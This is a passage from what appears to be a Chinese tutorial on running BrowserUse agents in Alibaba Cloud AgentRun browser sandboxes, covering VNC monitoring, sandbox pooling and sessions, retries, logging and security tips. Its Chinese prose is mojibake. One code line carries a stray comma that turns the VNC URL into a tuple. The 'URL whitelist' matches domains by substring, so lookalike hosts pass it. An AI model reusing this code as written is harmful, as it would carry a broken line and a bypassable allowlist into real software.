task=\"è®¿é—®é˜¿é‡Œäº‘å®˜ç½‘ï¼Œæ”¶é›†äº§å“åˆ†ç±»ä¿¡æ¯\",\n        llm=llm,\n        browser_session=browser_session,\n        use_vision=True\n    )\n    result1 = await agent1.run()\n    \n    # ä»»åŠ¡ 2ï¼šåŸºäºç¬¬ä¸€æ­¥ç»“æœç»§ç»­æ“ä½œ\n    agent2 = Agent(\n        task=f\"åŸºäºä»¥ä¸‹ä¿¡æ¯ï¼š{result1.final_result()}ï¼Œè®¿é—®æ¯ä¸ªäº§å“åˆ†ç±»å¹¶æå–å…³é”®ç‰¹æ€§\",\n        llm=llm,\n        browser_session=browser_session,\n        use_vision=True\n    )\n    result2 = await agent2.run()\n    \n    # æ¸…ç†èµ„æº\n    await browser_session.stop()\n    sandbox.delete()\n    \n    return result2.final_result()\n</code></pre>\n<h4 id=\"é›†æˆ-vnc-å®æ—¶ç›‘æ§\">é›†æˆ VNC å®æ—¶ç›‘æ§</h4>\n<pre><code class=\"language-python\">import webbrowser\nimport urllib.parse\n\nasync def run_with_vnc_monitoring():\n    \"\"\"è¿è¡Œ BrowserUse å¹¶å¯ç”¨ VNC ç›‘æ§\"\"\"\n    sandbox = Sandbox.create(\n        template_type=TemplateType.BROWSER,\n        template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n        sandbox_idle_timeout_seconds=3000\n    )\n    \n    # è·å– VNC URL å¹¶æ‰“å¼€æŸ¥çœ‹å™¨\n    vnc_url = sandbox.get_vnc_url(),\n    if vnc_url:\n        # ä¿®å¤ VNC URL è·¯å¾„\n        if vnc_url.endswith('/vnc'):\n            vnc_url = vnc_url[:-4] + '/ws/livestream'\n        \n        # åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ VNC æŸ¥çœ‹å™¨\n        encoded_url = urllib.parse.quote(vnc_url, safe='')\n        viewer_url = f\"file://path/to/vnc-viewer.html?url={encoded_url}\"\n        webbrowser.open(viewer_url)\n        print(f\"VNC æŸ¥çœ‹å™¨å·²æ‰“å¼€ï¼Œå¯å®æ—¶ç›‘æ§æµè§ˆå™¨æ“ä½œ\")\n    \n    # åˆ›å»ºå¹¶è¿è¡Œ Agent\n    llm = ChatOpenAI(\n        model='qwen-vl-max',\n        api_key=os.getenv(\"DASHSCOPE_API_KEY\"),\n        base_url=\"https://dashscope.aliyuncs.com/compatible-mode/v1\"\n    )\n    \n    browser_session = BrowserSession(\n        cdp_url=sandbox.get_cdp_url(),\n        browser_profile=BrowserProfile(headless=False, keep_alive=True)\n    )\n    \n    agent = Agent(\n        task=\"è®¿é—®æ·˜å®é¦–é¡µå¹¶æœç´¢å•†å“\",\n        llm=llm,\n        browser_session=browser_session,\n        use_vision=True\n    )\n    \n    result = await agent.run()\n    \n    # æ¸…ç†èµ„æº\n    await browser_session.stop()\n    sandbox.delete()\n    \n    return result.final_result()\n</code></pre>\n<h3 id=\"browseruse-æœ€ä½³å®è·µ\">BrowserUse æœ€ä½³å®è·µ</h3>\n<ol>\n<li><strong>å¯ç”¨è§†è§‰ç†è§£</strong>ï¼šå¯¹äºå¤æ‚é¡µé¢ï¼Œä½¿ç”¨ <code>use_vision=True</code> è®© LLM åˆ†æé¡µé¢æˆªå›¾</li>\n<li><strong>ä¿æŒä¼šè¯æ´»è·ƒ</strong>ï¼šä½¿ç”¨ <code>keep_alive=True</code> é¿å…é¢‘ç¹é‡å»ºè¿æ¥</li>\n<li><strong>åˆç†è®¾ç½®è¶…æ—¶</strong>ï¼šæ ¹æ®ä»»åŠ¡å¤æ‚åº¦è°ƒæ•´ <code>timeout</code> å‚æ•°</li>\n<li><strong>å¤ç”¨ BrowserSession</strong>ï¼šå¯¹äºå¤šæ­¥éª¤ä»»åŠ¡ï¼Œå¤ç”¨åŒä¸€ä¸ª BrowserSession æé«˜æ•ˆç‡</li>\n<li><strong>ç»“åˆ VNC è°ƒè¯•</strong>ï¼šå¼€å‘é˜¶æ®µå¯ç”¨ VNC å®æ—¶æŸ¥çœ‹ Agent è¡Œä¸º</li>\n</ol>\n<h3 id=\"è·å–å®Œæ•´ç¤ºä¾‹ä»£ç \">è·å–å®Œæ•´ç¤ºä¾‹ä»£ç </h3>\n<p>æœ¬æ–‡ä¸­çš„æ‰€æœ‰ç¤ºä¾‹ä»£ç éƒ½å¯ä»¥åœ¨ä»¥ä¸‹ä»“åº“ä¸­æ‰¾åˆ°ï¼š</p>\n<pre><code class=\"language-bash\"># å…‹éš†ç¤ºä¾‹ä»£ç ä»“åº“\ngit clone https://github.com/devsapp/agentrun-sandbox-demos.git\n\n# è¿›å…¥é¡¹ç›®ç›®å½•\ncd agentrun-browseruse-wth-sandbox-demo\n\n# å®‰è£…ä¾èµ–ï¼ˆæ³¨æ„éœ€è¦å®‰è£… server æ‰©å±•ï¼‰\npip install -r requirements.txt\n</code></pre>\n<h4 id=\"é…ç½®ç¯å¢ƒå˜é‡-1\">é…ç½®ç¯å¢ƒå˜é‡</h4>\n<pre><code class=\"language-bash\"># å¤åˆ¶ç¯å¢ƒå˜é‡æ¨¡æ¿\ncp env.example .env\n\n# ç¼–è¾‘ .env æ–‡ä»¶ï¼Œå¡«å…¥æ‚¨çš„é…ç½®ä¿¡æ¯\n# å¿…éœ€é…ç½®é¡¹ï¼š\n# - DASHSCOPE_API_KEY: DashScope API Keyï¼ˆç”¨äº Qwen æ¨¡å‹ï¼‰\n# - AGENTRUN_ACCOUNT_ID: AgentRun è´¦å· ID\n# - ALIBABA_CLOUD_ACCESS_KEY_ID: é˜¿é‡Œäº‘è®¿é—®å¯†é’¥ ID\n# - ALIBABA_CLOUD_ACCESS_KEY_SECRET: é˜¿é‡Œäº‘è®¿é—®å¯†é’¥ Secret\n# - BROWSER_TEMPLATE_NAME: Browser Sandbox æ¨¡æ¿åç§°\n</code></pre>\n<h4 id=\"è¿è¡Œç¤ºä¾‹ä¸¤æ­¥è¿è¡Œè®¾è®¡\">è¿è¡Œç¤ºä¾‹ï¼ˆä¸¤æ­¥è¿è¡Œè®¾è®¡ï¼‰</h4>\n<p>æœ¬é¡¹ç›®é‡‡ç”¨<strong>æœåŠ¡å™¨-å®¢æˆ·ç«¯</strong>çš„æ¶æ„è®¾è®¡ï¼Œéœ€è¦åˆ†ä¸¤æ­¥è¿è¡Œï¼š</p>\n<p><strong>ç¬¬ä¸€æ­¥ï¼šå¯åŠ¨ VNC æŸ¥çœ‹å™¨æœåŠ¡</strong></p>\n<pre><code class=\"language-bash\"># åœ¨ç»ˆç«¯ 1 ä¸­å¯åŠ¨ VNC Web æœåŠ¡å™¨\npython main.py\n\n# æœåŠ¡å¯åŠ¨åä¼šæ˜¾ç¤ºï¼š\n# VNC æŸ¥çœ‹å™¨æœåŠ¡å·²å¯åŠ¨: http://localhost:8000\n# è®¿é—® http://localhost:8000 å¯ä»¥å®æ—¶æŸ¥çœ‹æµè§ˆå™¨æ“ä½œ\n</code></pre>\n<p><code>main.py</code> çš„ä½œç”¨ï¼š</p>\n<ul>\n<li>å¯åŠ¨æœ¬åœ° Web æœåŠ¡å™¨ï¼Œæä¾› VNC å®æ—¶æŸ¥çœ‹ç•Œé¢</li>\n<li>æä¾› WebSocket ä»£ç†ï¼Œè¿æ¥ AgentRun Sandbox çš„ VNC æœåŠ¡</li>\n<li>å…è®¸æ‚¨åœ¨æµè§ˆå™¨ä¸­å®æ—¶ç›‘æ§ Agent çš„æ“ä½œè¿‡ç¨‹</li>\n</ul>\n<p><strong>ç¬¬äºŒæ­¥ï¼šè¿è¡Œ BrowserUse ç¤ºä¾‹</strong></p>\n<pre><code class=\"language-bash\"># åœ¨ç»ˆç«¯ 2 ä¸­è¿è¡Œç¤ºä¾‹ä»£ç \npython examples/01_browseruse_basic.py\n\n# è¿è¡Œé«˜çº§ç¤ºä¾‹\npython examples/02_browseruse_advanced.py\n</code></pre>\n<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ä¸¤æ­¥è¿è¡Œï¼Ÿ</strong></p>\n<ol>\n<li><strong>å®æ—¶ç›‘æ§</strong>ï¼šmain.py æä¾› VNC æŸ¥çœ‹å™¨ï¼Œå¯ä»¥å®æ—¶çœ‹åˆ° Agent åœ¨æµè§ˆå™¨ä¸­çš„æ“ä½œ</li>\n<li><strong>è°ƒè¯•å‹å¥½</strong>ï¼šé€šè¿‡å¯è§†åŒ–ç•Œé¢ï¼Œæ›´å®¹æ˜“ç†è§£ Agent çš„å†³ç­–è¿‡ç¨‹å’Œè¡Œä¸º</li>\n<li><strong>æœåŠ¡è§£è€¦</strong>ï¼šVNC æœåŠ¡å’Œä¸šåŠ¡é€»è¾‘åˆ†ç¦»ï¼Œå¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªç¤ºä¾‹è€Œå…±ç”¨åŒä¸€ä¸ªæŸ¥çœ‹å™¨</li>\n</ol>\n<p><strong>è¿è¡Œæµç¨‹å›¾ï¼š</strong></p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p><strong>ä»“åº“å†…å®¹åŒ…æ‹¬ï¼š</strong></p>\n<ul>\n<li><code>main.py</code>: VNC Web æœåŠ¡å™¨ï¼Œç”¨äºå®æ—¶ç›‘æ§</li>\n<li><code>examples/01_browseruse_basic.py</code>: åŸºç¡€é›†æˆç¤ºä¾‹</li>\n<li><code>examples/02_browseruse_advanced.py</code>: é«˜çº§é…ç½®ç¤ºä¾‹</li>\n<li><code>examples/sandbox_manager.py</code>: Sandbox ç”Ÿå‘½å‘¨æœŸç®¡ç†</li>\n<li><code>vncviewer/</code>: VNC æŸ¥çœ‹å™¨å‰ç«¯å’Œåç«¯ä»£ç </li>\n<li>å®Œæ•´çš„ç¯å¢ƒé…ç½®å’Œæœ€ä½³å®è·µä»£ç </li>\n</ul>\n<hr />\n<h2 id=\"sandbox-ç”Ÿå‘½å‘¨æœŸç®¡ç†æœ€ä½³å®è·µ\">Sandbox ç”Ÿå‘½å‘¨æœŸç®¡ç†æœ€ä½³å®è·µ</h2>\n<h3 id=\"ä¸‰ç§ç®¡ç†æ¨¡å¼\">ä¸‰ç§ç®¡ç†æ¨¡å¼</h3>\n<p>æ ¹æ®ä¸åŒçš„åº”ç”¨åœºæ™¯,æˆ‘ä»¬æ¨èä¸‰ç§ Sandbox ç®¡ç†æ¨¡å¼ï¼š</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p><strong>æ–¹æ¡ˆå¯¹æ¯”ï¼š</strong></p>\n<table>\n<thead>\n<tr>\n<th>ç®¡ç†æ¨¡å¼</th>\n<th>ä¼˜ç‚¹</th>\n<th>ç¼ºç‚¹</th>\n<th>é€‚ç”¨åœºæ™¯</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>å•ä¾‹æ¨¡å¼</strong></td>\n<td>â€¢ èµ„æºå¤ç”¨   â€¢ å“åº”å¿«   â€¢ ç®€å•æ˜“ç”¨</td>\n<td>â€¢ çŠ¶æ€æ±¡æŸ“é£é™©   â€¢ ä¸é€‚åˆå¹¶å‘</td>\n<td>å¼€å‘è°ƒè¯•   å¤šè½®å¯¹è¯   ä¸ªäººåº”ç”¨</td>\n</tr>\n<tr>\n<td><strong>è¯·æ±‚çº§åˆ«</strong></td>\n<td>â€¢ ç¯å¢ƒéš”ç¦»   â€¢ çŠ¶æ€ç‹¬ç«‹   â€¢ å®‰å…¨æ€§é«˜</td>\n<td>â€¢ åˆ›å»ºå¼€é”€å¤§   â€¢ æˆæœ¬è¾ƒé«˜</td>\n<td>ä¸€æ¬¡æ€§ä»»åŠ¡   é«˜å®‰å…¨éœ€æ±‚   æ— çŠ¶æ€æœåŠ¡</td>\n</tr>\n<tr>\n<td><strong>è¿æ¥æ± </strong></td>\n<td>â€¢ å¹¶å‘èƒ½åŠ›å¼º   â€¢ èµ„æºåˆ©ç”¨ç‡é«˜   â€¢ æ€§èƒ½ç¨³å®š</td>\n<td>â€¢ å®ç°å¤æ‚   â€¢ éœ€è¦ç›‘æ§</td>\n<td>ç”Ÿäº§ç¯å¢ƒ   é«˜å¹¶å‘æœåŠ¡   ä¼ä¸šåº”ç”¨</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"å•ä¾‹æ¨¡å¼å®ç°\">å•ä¾‹æ¨¡å¼å®ç°</h3>\n<p>é€‚åˆå¼€å‘è°ƒè¯•å’Œå¤šè½®å¯¹è¯åœºæ™¯ï¼š</p>\n<pre><code class=\"language-python\">class SandboxManager:\n    \"\"\"å•ä¾‹æ¨¡å¼ Sandbox ç®¡ç†å™¨\"\"\"\n    _instance = None\n    _sandbox = None\n    \n    def __new__(cls):\n        if cls._instance is None:\n            cls._instance = super().__new__(cls)\n        return cls._instance\n    \n    def get_or_create(self):\n        \"\"\"è·å–æˆ–åˆ›å»º Sandbox\"\"\"\n        if self._sandbox is None:\n            self._sandbox = Sandbox.create(\n                template_type=TemplateType.BROWSER,\n                template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n                sandbox_idle_timeout_seconds=3000\n            )\n        return self._sandbox\n    \n    def destroy(self):\n        \"\"\"é”€æ¯ Sandbox\"\"\"\n        if self._sandbox:\n            self._sandbox.delete()\n            self._sandbox = None\n\n# ä½¿ç”¨\nmanager = SandboxManager()\nsandbox = manager.get_or_create()  # é¦–æ¬¡åˆ›å»º\nsandbox = manager.get_or_create()  # å¤ç”¨ç°æœ‰å®ä¾‹\n</code></pre>\n<h3 id=\"è¿æ¥æ± æ¨¡å¼å®ç°\">è¿æ¥æ± æ¨¡å¼å®ç°</h3>\n<p>é€‚åˆé«˜å¹¶å‘ç”Ÿäº§ç¯å¢ƒï¼š</p>\n<pre><code class=\"language-python\">from queue import Queue\nfrom threading import Lock\n\nclass SandboxPool:\n    \"\"\"Sandbox è¿æ¥æ± \"\"\"\n    \n    def __init__(self, pool_size=5, max_idle_time=300):\n        self.pool_size = pool_size\n        self.max_idle_time = max_idle_time\n        self.pool = Queue(maxsize=pool_size)\n        self.lock = Lock()\n        self._initialize_pool()\n    \n    def _initialize_pool(self):\n        \"\"\"åˆå§‹åŒ–è¿æ¥æ± \"\"\"\n        for _ in range(self.pool_size):\n            sandbox = self._create_sandbox()\n            self.pool.put(sandbox)\n    \n    def _create_sandbox(self):\n        \"\"\"åˆ›å»º Sandbox å®ä¾‹\"\"\"\n        return Sandbox.create(\n            template_type=TemplateType.BROWSER,\n            template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n            sandbox_idle_timeout_seconds=self.max_idle_time\n        )\n    \n    def acquire(self, timeout=30):\n        \"\"\"è·å– Sandbox å®ä¾‹\"\"\"\n        try:\n            sandbox = self.pool.get(timeout=timeout)\n            if not self._is_alive(sandbox):\n                sandbox = self._create_sandbox()\n            return sandbox\n        except:\n            raise RuntimeError(\"è·å– Sandbox è¶…æ—¶\")\n    \n    def release(self, sandbox):\n        \"\"\"å½’è¿˜ Sandbox å®ä¾‹\"\"\"\n        if self._is_alive(sandbox):\n            self.pool.put(sandbox)\n        else:\n            new_sandbox = self._create_sandbox()\n            self.pool.put(new_sandbox)\n    \n    def _is_alive(self, sandbox):\n        \"\"\"æ£€æŸ¥ Sandbox æ˜¯å¦å­˜æ´»\"\"\"\n        try:\n            return hasattr(sandbox, 'sandbox_id')\n        except:\n            return False\n\n# ä½¿ç”¨\npool = SandboxPool(pool_size=5)\n\nsandbox = pool.acquire()\ntry:\n    # ä½¿ç”¨ sandbox æ‰§è¡Œä»»åŠ¡\n    pass\nfinally:\n    pool.release(sandbox)\n</code></pre>\n<h3 id=\"ä¼šè¯çŠ¶æ€ç®¡ç†\">ä¼šè¯çŠ¶æ€ç®¡ç†</h3>\n<p>æ”¯æŒå¤šç”¨æˆ·å¤šä¼šè¯åœºæ™¯ï¼š</p>\n<pre><code class=\"language-python\">import time\n\nclass SessionManager:\n    \"\"\"ä¼šè¯çŠ¶æ€ç®¡ç†\"\"\"\n    \n    def __init__(self):\n        self.sessions = {}  # session_id -&gt; sandbox\n    \n    def create_session(self, session_id: str):\n        \"\"\"åˆ›å»ºä¼šè¯\"\"\"\n        if session_id not in self.sessions:\n            sandbox = Sandbox.create(\n                template_type=TemplateType.BROWSER,\n                template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n                sandbox_idle_timeout_seconds=1800\n            )\n            self.sessions[session_id] = {\n                'sandbox': sandbox,\n                'created_at': time.time(),\n                'last_used': time.time()\n            }\n        return self.sessions[session_id]['sandbox']\n    \n    def get_session(self, session_id: str):\n        \"\"\"è·å–ä¼šè¯\"\"\"\n        if session_id in self.sessions:\n            session = self.sessions[session_id]\n            session['last_used'] = time.time()\n            return session['sandbox']\n        return None\n    \n    def cleanup_expired_sessions(self, max_idle_time=1800):\n        \"\"\"æ¸…ç†è¿‡æœŸä¼šè¯\"\"\"\n        current_time = time.time()\n        expired_sessions = []\n        \n        for session_id, session in self.sessions.items():\n            if current_time - session['last_used'] &gt; max_idle_time:\n                expired_sessions.append(session_id)\n        \n        for session_id in expired_sessions:\n            self.destroy_session(session_id)\n    \n    def destroy_session(self, session_id: str):\n        \"\"\"é”€æ¯ä¼šè¯\"\"\"\n        if session_id in self.sessions:\n            self.sessions[session_id]['sandbox'].delete()\n            del self.sessions[session_id]\n</code></pre>\n<h2 id=\"æ€§èƒ½ä¼˜åŒ–\">æ€§èƒ½ä¼˜åŒ–</h2>\n<h3 id=\"è¶…æ—¶æ—¶é—´é…ç½®\">è¶…æ—¶æ—¶é—´é…ç½®</h3>\n<p>åˆç†è®¾ç½®è¶…æ—¶æ—¶é—´æ˜¯å¹³è¡¡æ€§èƒ½å’Œæˆæœ¬çš„å…³é”®ï¼š</p>\n<pre><code class=\"language-python\"># å¼€å‘ç¯å¢ƒï¼ˆè°ƒè¯•ç”¨ï¼‰\nsandbox = Sandbox.create(\n    template_name=\"dev-template\",\n    sandbox_idle_timeout_seconds=7200  # 2 å°æ—¶\n)\n\n# ç”Ÿäº§ç¯å¢ƒï¼ˆå•æ¬¡ä»»åŠ¡ï¼‰\nsandbox = Sandbox.create(\n    template_name=\"prod-template\",\n    sandbox_idle_timeout_seconds=300  # 5 åˆ†é’Ÿ\n)\n\n# é•¿æ—¶é—´ä»»åŠ¡\nsandbox = Sandbox.create(\n    template_name=\"long-task-template\",\n    sandbox_idle_timeout_seconds=10800  # 3 å°æ—¶\n)\n</code></pre>\n<p><strong>è¶…æ—¶ç­–ç•¥æ¨èï¼š</strong></p>\n<table>\n<thead>\n<tr>\n<th>åœºæ™¯</th>\n<th>æ¨èè¶…æ—¶</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å¼€å‘è°ƒè¯•</td>\n<td>1-2 å°æ—¶</td>\n<td>æ–¹ä¾¿è°ƒè¯•,é¿å…é¢‘ç¹é‡å»º</td>\n</tr>\n<tr>\n<td>ç®€å•ä»»åŠ¡</td>\n<td>5-10 åˆ†é’Ÿ</td>\n<td>å•é¡µæ“ä½œ,å¿«é€Ÿå®Œæˆ</td>\n</tr>\n<tr>\n<td>å¤æ‚ä»»åŠ¡</td>\n<td>30-60 åˆ†é’Ÿ</td>\n<td>å¤šæ­¥éª¤æµç¨‹,éœ€è¦æ—¶é—´</td>\n</tr>\n<tr>\n<td>åå°æœåŠ¡</td>\n<td>2-4 å°æ—¶</td>\n<td>é•¿æœŸè¿è¡Œ,å®šæœŸåˆ·æ–°</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"sandbox-å¤ç”¨ç­–ç•¥\">Sandbox å¤ç”¨ç­–ç•¥</h3>\n<pre><code class=\"language-python\">class SmartSandboxManager:\n    \"\"\"æ™ºèƒ½ Sandbox å¤ç”¨ç®¡ç†å™¨\"\"\"\n    \n    def __init__(self):\n        self.sandboxes = {}  # key -&gt; sandbox\n        self.usage_count = {}  # key -&gt; count\n    \n    def get_sandbox(self, user_id: str, session_id: str):\n        \"\"\"è·å–æˆ–åˆ›å»º Sandboxï¼ˆæ”¯æŒå¤ç”¨ï¼‰\"\"\"\n        key = f\"{user_id}:{session_id}\"\n        \n        if key not in self.sandboxes:\n            self.sandboxes[key] = Sandbox.create(\n                template_type=TemplateType.BROWSER,\n                template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n                sandbox_idle_timeout_seconds=1800\n            )\n            self.usage_count[key] = 0\n        \n        self.usage_count[key] += 1\n        return self.sandboxes[key]\n    \n    def should_recreate(self, key: str, max_reuse=50):\n        \"\"\"åˆ¤æ–­æ˜¯å¦éœ€è¦é‡å»ºï¼ˆé˜²æ­¢çŠ¶æ€ç´¯ç§¯ï¼‰\"\"\"\n        return self.usage_count.get(key, 0) &gt;= max_reuse\n    \n    def recreate_if_needed(self, key: str):\n        \"\"\"æŒ‰éœ€é‡å»º Sandbox\"\"\"\n        if self.should_recreate(key):\n            if key in self.sandboxes:\n                self.sandboxes[key].delete()\n                del self.sandboxes[key]\n                self.usage_count[key] = 0\n</code></pre>\n<h3 id=\"é”™è¯¯å¤„ç†å’Œé‡è¯•æœºåˆ¶\">é”™è¯¯å¤„ç†å’Œé‡è¯•æœºåˆ¶</h3>\n<p>ä½¿ç”¨ tenacity åº“å®ç°æ™ºèƒ½é‡è¯•ï¼š</p>\n<pre><code class=\"language-python\">from tenacity import retry, stop_after_attempt, wait_exponential, retry_if_exception_type\n\nclass SandboxError(Exception):\n    \"\"\"Sandbox æ“ä½œå¼‚å¸¸\"\"\"\n    pass\n\n@retry(\n    retry=retry_if_exception_type(SandboxError),\n    stop=stop_after_attempt(3),\n    wait=wait_exponential(multiplier=1, min=2, max=10)\n)\ndef execute_with_retry(sandbox, operation):\n    \"\"\"å¸¦é‡è¯•çš„æ“ä½œæ‰§è¡Œ\"\"\"\n    try:\n        return operation(sandbox)\n    except ConnectionError:\n        raise SandboxError(\"è¿æ¥å¤±è´¥\")\n    except TimeoutError:\n        raise SandboxError(\"æ“ä½œè¶…æ—¶\")\n    except Exception as e:\n        print(f\"æ“ä½œå¤±è´¥: {e}\")\n        raise SandboxError(f\"æ“ä½œå¤±è´¥: {e}\")\n\n# ä½¿ç”¨ç¤ºä¾‹\ndef navigate_page(sandbox):\n    with sync_playwright() as p:\n        browser = p.chromium.connect_over_cdp(sandbox.cdp_url)\n        page = browser.contexts[0].pages[0]\n        page.goto(\"https://example.com\", timeout=30000)\n        return page.title()\n\nresult = execute_with_retry(sandbox, navigate_page)\n</code></pre>\n<h2 id=\"å®‰å…¨æ€§æœ€ä½³å®è·µ\">å®‰å…¨æ€§æœ€ä½³å®è·µ</h2>\n<h3 id=\"ç¯å¢ƒå˜é‡ä¿æŠ¤\">ç¯å¢ƒå˜é‡ä¿æŠ¤</h3>\n<pre><code class=\"language-python\">import os\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\n# éªŒè¯å¿…éœ€çš„ç¯å¢ƒå˜é‡\nrequired_vars = [\"DASHSCOPE_API_KEY\", \"AGENTRUN_ACCOUNT_ID\"]\nmissing_vars = [var for var in required_vars if not os.getenv(var)]\nif missing_vars:\n    raise ValueError(f\"ç¼ºå°‘å¿…éœ€çš„ç¯å¢ƒå˜é‡: {', '.join(missing_vars)}\")\n\n# æ•æ„Ÿä¿¡æ¯ä¸è¦ç¡¬ç¼–ç \nAPI_KEY = os.getenv(\"DASHSCOPE_API_KEY\")\nACCESS_KEY_ID = os.getenv(\"ALIBABA_CLOUD_ACCESS_KEY_ID\")\nACCESS_KEY_SECRET = os.getenv(\"ALIBABA_CLOUD_ACCESS_KEY_SECRET\")\n</code></pre>\n<h3 id=\"url-ç™½åå•\">URL ç™½åå•</h3>\n<pre><code class=\"language-python\">ALLOWED_DOMAINS = [\n    'example.com',\n    'aliyun.com',\n    'alibaba.com'\n]\n\ndef is_url_allowed(url: str) -&gt; bool:\n    \"\"\"æ£€æŸ¥ URL æ˜¯å¦åœ¨ç™½åå•ä¸­\"\"\"\n    from urllib.parse import urlparse\n    domain = urlparse(url).netloc\n    return any(allowed in domain for allowed in ALLOWED_DOMAINS)\n\ndef safe_navigate(page, url: str):\n    \"\"\"å®‰å…¨å¯¼èˆª\"\"\"\n    if not is_url_allowed(url):\n        raise ValueError(f\"URL ä¸åœ¨ç™½åå•ä¸­: {url}\")\n    page.goto(url)\n</code></pre>\n<h3 id=\"æ—¥å¿—è„±æ•\">æ—¥å¿—è„±æ•</h3>\n<pre><code class=\"language-python\">import re\n\ndef sanitize_log(log_text: str) -&gt; str:\n    \"\"\"æ—¥å¿—è„±æ•\"\"\"\n    # è„±æ• API Key\n    log_text = re.sub(r'sk-[a-zA-Z0-9]{20,}', 'sk-***', log_text)\n    # è„±æ• Access Key\n    log_text = re.sub(r'LTAI[a-zA-Z0-9]{12,}', 'LTAI***', log_text)\n    # è„±æ•å¯†ç \n    log_text = re.sub(r'password[\"\\s:=]+[^\"\\s,}]+', 'password: ***', log_text, flags=re.IGNORECASE)\n    return log_text\n\n# ä½¿ç”¨\nprint(sanitize_log(f\"ä½¿ç”¨ API Key: {API_KEY}\"))\n</code></pre>\n<h2 id=\"å¯è§‚æµ‹æ€§ä¸ç›‘æ§\">å¯è§‚æµ‹æ€§ä¸ç›‘æ§</h2>\n<h3 id=\"æ—¥å¿—è®°å½•æœ€ä½³å®è·µ\">æ—¥å¿—è®°å½•æœ€ä½³å®è·µ</h3>\n<pre><code class=\"language-python\">import logging\nfrom datetime import datetime\n\n# é…ç½®æ—¥å¿—\nlogging.basicConfig(\n    level=logging.INFO,\n    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',\n    handlers=[\n        logging.FileHandler(f'sandbox_{datetime.now().strftime(\"%Y%m%d\")}.log'),\n        logging.StreamHandler()\n    ]\n)\n\nlogger = logging.getLogger(__name__)\n\nclass MonitoredSandboxManager:\n    \"\"\"å¸¦ç›‘æ§çš„ Sandbox ç®¡ç†å™¨\"\"\"\n    \n    def create_sandbox(self, **kwargs):\n        \"\"\"åˆ›å»º Sandboxï¼ˆå¸¦æ—¥å¿—ï¼‰\"\"\"\n        start_time = time.time()\n        logger.info(f\"å¼€å§‹åˆ›å»º Sandbox: {kwargs}\")\n        \n        try:\n            sandbox = Sandbox.create(**kwargs)\n            duration = time.time() - start_time\n            logger.info(f\"Sandbox åˆ›å»ºæˆåŠŸ: {sandbox.sandbox_id}, è€—æ—¶: {duration:.2f}s\")\n            return sandbox\n        except Exception as e:\n            duration = time.time() - start_time\n            logger.error(f\"Sandbox åˆ›å»ºå¤±è´¥: {e}, è€—æ—¶: {duration:.2f}s\")\n            raise\n    \n    def execute_task(self, sandbox, task_name: str, operation):\n        \"\"\"æ‰§è¡Œä»»åŠ¡ï¼ˆå¸¦æ—¥å¿—ï¼‰\"\"\"\n        start_time = time.time()\n        logger.info(f\"å¼€å§‹æ‰§è¡Œä»»åŠ¡: {task_name}, Sandbox: {sandbox.sandbox_id}\")\n        \n        try:\n            result = operation(sandbox)\n            duration = time.time() - start_time\n            logger.info(f\"ä»»åŠ¡æ‰§è¡ŒæˆåŠŸ: {task_name}, è€—æ—¶: {duration:.2f}s\")\n            return result\n        except Exception as e:\n            duration = time.time() - start_time\n            logger.error(f\"ä»»åŠ¡æ‰§è¡Œå¤±è´¥: {task_name}, é”™è¯¯: {e}, è€—æ—¶: {duration:.2f}s\")\n            raise\n</code></pre>\n<h3 id=\"æŒ‡æ ‡æ”¶é›†\">æŒ‡æ ‡æ”¶é›†</h3>\n<pre><code class=\"language-python\">from dataclasses import dataclass\nfrom typing import Dict, List\nimport json\n\n@dataclass\nclass SandboxMetrics:\n    \"\"\"Sandbox æŒ‡æ ‡\"\"\"\n    sandbox_id: str\n    create_time: float\n    destroy_time: float = None\n    total_requests: int = 0\n    failed_requests: int = 0\n    total_duration: float = 0.0\n\nclass MetricsCollector:\n    \"\"\"æŒ‡æ ‡æ”¶é›†å™¨\"\"\"\n    \n    def __init__(self):\n        self.metrics: Dict[str, SandboxMetrics] = {}\n    \n    def record_creation(self, sandbox_id: str):\n        \"\"\"è®°å½•åˆ›å»º\"\"\"\n        self.metrics[sandbox_id] = SandboxMetrics(\n            sandbox_id=sandbox_id,\n            create_time=time.time()\n        )\n    \n    def record_request(self, sandbox_id: str, duration: float, success: bool):\n        \"\"\"è®°å½•è¯·æ±‚\"\"\"\n        if sandbox_id in self.metrics:\n            metric = self.metrics[sandbox_id]\n            metric.total_requests += 1\n            metric.total_duration += duration\n            if not success:\n                metric.failed_requests += 1\n    \n    def record_destruction(self, sandbox_id: str):\n        \"\"\"è®°å½•é”€æ¯\"\"\"\n        if sandbox_id in self.metrics:\n            self.metrics[sandbox_id].destroy_time = time.time()\n    \n    def export_metrics(self, filepath: str):\n        \"\"\"å¯¼å‡ºæŒ‡æ ‡\"\"\"\n        metrics_data = [\n            {\n                'sandbox_id': m.sandbox_id,\n                'create_time': m.create_time,\n                'destroy_time': m.destroy_time,\n                'total_requests': m.total_requests,\n                'failed_requests': m.failed_requests,\n                'success_rate': (m.total_requests - m.failed_requests) / m.total_requests if m.total_requests &gt; 0 else 0,\n                'avg_duration': m.total_duration / m.total_requests if m.total_requests &gt; 0 else 0,\n                'lifetime': m.destroy_time - m.create_time if m.destroy_time else time.time() - m.create_time\n            }\n            for m in self.metrics.values()\n        ]\n        \n        with open(filepath, 'w') as f:\n            json.dump(metrics_data, f, indent=2)\n\n# ä½¿ç”¨\ncollector = MetricsCollector()\ncollector.record_creation(sandbox.sandbox_id)\n# ... æ‰§è¡Œä»»åŠ¡ ...\ncollector.export_metrics('metrics.json')\n</code></pre>\n<h2 id=\"æˆæœ¬ä¼˜åŒ–\">æˆæœ¬ä¼˜åŒ–</h2>\n<h3 